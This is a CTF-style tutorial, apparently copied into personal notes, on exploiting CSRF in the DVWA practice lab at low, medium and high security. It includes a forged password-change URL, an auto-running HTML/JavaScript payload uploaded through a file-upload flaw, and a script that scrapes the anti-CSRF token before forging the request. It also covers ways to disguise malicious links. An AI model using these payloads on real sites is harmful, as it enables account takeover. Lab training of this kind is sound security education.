**CSRF stands for Cross-Site Request Forgery and is an attack that occurs when in some way an attacker can trick your web browser into performing an unwanted action on a trusted website where you are currently authenticated.**

As usual, before starting let’s see the prerequisites.
## Step #0: Prerequisites:

So, once we have:

- a working DVWA application
- the attacking machine  

we can run the VPN and log in.

As usual, the default credentials are:

- **Username**: admin
- **Password**: password

![Dvwa login screen](http://stackzero.net/wp-content/uploads/2022/11/dvwa_login-1024x337.png.png)

The default difficulty is “Impossible”, so the next step will be to go into settings and set it as “Low”.

![DVWA setting security](http://stackzero.net/wp-content/uploads/2022/11/dvwa_security-1024x615.jpg.png)

Finally, click on the CSRF menu item and we are ready to start!

## Step #1: CSRF On DVWA With Low-Security Level:

As the level suggests, this is extremely easy, but consider it as a warm-up.  
Furthermore, I think that this is the best level to understand the underlying concept if we missed something.

By opening the page, we see a form where we can change our password.

![CSRF DVWA main page](http://stackzero.net/wp-content/uploads/2022/11/csrf_dvwa_main.jpg)

The first thing that should come to mind is to try changing passwords and observing the results.

And after doing that we are still on the same page, but looking at the URL bar, there is an interesting value.  
For example, if the new password is: “stackzero” the result will be something like this:

`http://10.10.93.202/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change#`

It’s clear that the form accepts a [GET HTTP](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods) request and sends three parameters named:

- password_new
- password_conf
- Change

So try to imagine an attacker that will send you a malicious address like:

`http://10.10.93.202/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change#`

If he finds a way to let you click when you are still authenticated, your password will automatically be **stackzero**.

If you don’t believe me, try to copy-paste that address (by replacing the IP with the one related to your DVWA instance), then log out of DVWA and try to log in again.  
You will see that your password is no more “password” but now is “**stackzero**“.

This address can have an obvious behaviour, so the hacker could try to hide his intents in some ways, for example:

- He can use a tool like [CyberChef](https://gchq.github.io/CyberChef/) to obfuscate the URL for example with URL-Encoding so that the victim will see an URL like this one:  
    `http%3A%2F%2F10%2E10%2E93%2E202%2Fvulnerabilities%2Fcsrf%2F%3Fpassword%5Fnew%3Dhaker%5Fpassword%26password%5Fconf%3Dhacker%5Fpassword%26Change%3DChange%23`
- He can build a page containing a malicious JS code that sends the request on his hosting machine.
- He can use a URL shortener like [Bity](https://bitly.com/).

It all depends on the attacker’s imagination.

In any case, we have passed the first level and created the payload we needed, we can then move to the next level!

## Step #2: CSRF On DVWA With Medium-Security Level:

We are ready to increase a bit the difficulty, so go to the security settings and set the level as a medium.

By trying to open the malicious link we have just created at a low level it’s not working and the password remains the same.

**Why?**  
The developer has added layer of security and in this case, the application checks the Referer (If you know what is it here is the [Wikipedia Page](https://en.wikipedia.org/wiki/HTTP_referer)).  
What we need to know about the Referer field is that it’s an optional header field which specifies from which the HTTP request comes. In this case, the application checks that the request is coming from the same domain.

It can be good mitigation in general, but **it’s not enough to stop us!**  
Intercepting the request and changing the Referer with [Burp Suite](https://portswigger.net/burp) is not possible in a real case because it should be done on the victim machine.

The first idea we can have is to create an HTML containing a script that sends a request to the vulnerable server by using [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) and setting the Referer as the target URL like this:

```javascript
const HttpRequest = new XMLHttpRequest();
const url=const url = 'http://10.10.131.218/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change#'
;
HttpRequest.open("GET", url);
HttpRequest.send();
```

  
That seems a good idea, but it cannot be done because the majority of the browsers don’t allow changing this header.

What we want at this point is to send the request directly from the target server, and to do that we have a very easy option.  
As I told you in the introductory article at [this address](http://stackzero.net/csrf-introduction/) we can chain an XSS and a CSRF vulnerability, so we could pack this payload within a reflected XSS for example.

However, in this walkthrough, I want to show you another easier way that can make us just focus on CSRF.  
We are going to use a file upload vulnerability to send our payload to the server and then we can simply deliver the malicious link.

So the first step is to set again the security of DVWA as low ( this is not a tutorial on File Upload so we don’t want to manage its security checks).

After doing that we can create an HTML file that I’m going to call “_csrf_js.html_“, and it will contain the payload.

This is the file content:

```
<html>
    <head>

    </head>
    <body onload="change_password()">
        <script>
            function change_password(){
            const request = new XMLHttpRequest();
            const url = 'http://10.10.131.218/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change#'

            request.open("GET", url);
     
            request.send();

            </script>
    </body>
</html>
```

As you can see is a very basic request with Javascript that runs on a body load event.

**“The URL depends on your target machine”**

After saving this file, and setting the security as LOW, go into the File Upload section:

![](http://stackzero.net/wp-content/uploads/2022/11/file_upload_main.jpg)

You can upload that and BAM!  
Now you have your malicious link to send to your victim that has this format:

`<VULNERABLE_SERVER_IP>/hackable/uploads/<HTML_PAYLOAD>`

So in my case, it will be:

`http://10.10.131.218/hackable/uploads/csrf_js.html`

The exploit is done! Now set again DVWA security as Medium and try to go to that link.  
Logging out and logging in again you can see that now your password is _“stackzero”_ or whatever you put in the payload.  
As an exercise, I suggest you do the same by taking advantage of XSS.

## Step #3: CSRF On DVWA With High-Security Level:

Finally, we got to the last level, so got to settings and set the security as HIGH!

If you click on the CSRF button, apparently nothing has changed, but try to inspect the form!  
This time something looks different:

```markup
		<form action="#" method="GET">
			New password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password_new"><br />
			Confirm new password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
			<br />
			<input type="submit" value="Change" name="Change">
			<input type='hidden' name='user_token' value='9bfa81172750a77bf8005690ed7a5593' />
		</form>
```

In particular, there is a hidden input value that changes on every page refresh.  
It’s called “user_token” and we’ve already seen it [here](http://stackzero.net/csrf-introduction/#csrf-token) (CSRF token).

We are going to split our exploit into two steps:

- A first call gets the “user_token” value by using a regex.
- A second call runs the real exploit.

The way we are placing our exploit is the same as the medium difficulty level.  
So I won’t spend so many words on that.

First of all our Javascript code has to send a normal request to the target page.

```javascript
            const request = new XMLHttpRequest();
            const url = "http://10.10.174.199/vulnerabilities/csrf/"
            

            request.open("GET", url);
```

By default, the response is a string, so in the method called “`onreadystatechanged`” we can extract the user_token.

We can go faster by observing that it’s composed of 32 hexadecimal chars and that there are no ambiguities on the page.

This can be a working simple regex:

`/[a-f0-9]{32}/g`

After that, let’s write the function that will get the user_token through a regex and then changes the password.

```javascript
            request.onreadystatechange = () => {
            if (request.readyState === request.DONE && request.status === 200) {

                var response = request.responseText;

                var user_token = /[a-f0-9]{32}/g.exec(response)[0]
                var payload = "http://10.10.174.199/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change&user_token="+user_token;
                var second_request = new XMLHttpRequest();
                second_request.open("GET", payload);
                second_request.send()

            }
            };
```

In a few words, this code:

- Saves the response of the first request in a variable
- Uses a regex to find a user_token (the result is always a list even if it has just one element)
- Builds the malicious URL
- Sends the second request

Finally, to make the CSRF exploit work:

- Set the security as LOW (we will see how to bypass the measures of File Upload in another article).
- Go into the File Upload section and upload your exploit, as you did at the medium security level.
- Set the security as HIGH
- Imagine you send the link to the HTML file containing the exploit to your target.
- Try to open the link you would have sent to your target
- Log out, then try to log in and see if it worked.

At this point, I hope it’s pretty clear how to perform a real-world CSRF (even if you are on DVWA) attack combined with another vulnerability.

Just for clarity, I want to show you the complete exploit code:

## Conclusion

In conclusion, you have seen how it’s possible to combine different vulnerabilities to reach the goal, and how a similar vulnerability can be dangerous.  
You also saw how in certain cases the mitigations may not be enough, so pay attention if you are a developer.

#### **What could be a valid solution?**

In this case, two solutions to make the application more secure can be

- to ask for the old password before proceeding
- Asking for a captcha.

I take this opportunity to invite you to take a better look at the applications you use and to notice the solutions they use.

Meanwhile, I hope you enjoyed the article on how to exploit CSRF within a DVWA machine. If you like my work I invite you to follow this blog and all my social, it would help me a lot.

Thank you and see you in the next article.


there are two ways to do this one is above one 
for that the link is this one:
https://www.stackzero.net/csrf-dvwa/

and also one trickier way is mentioned here i dont understand much but will try in future.
[[CSRF Cross Site Request Forgery1]]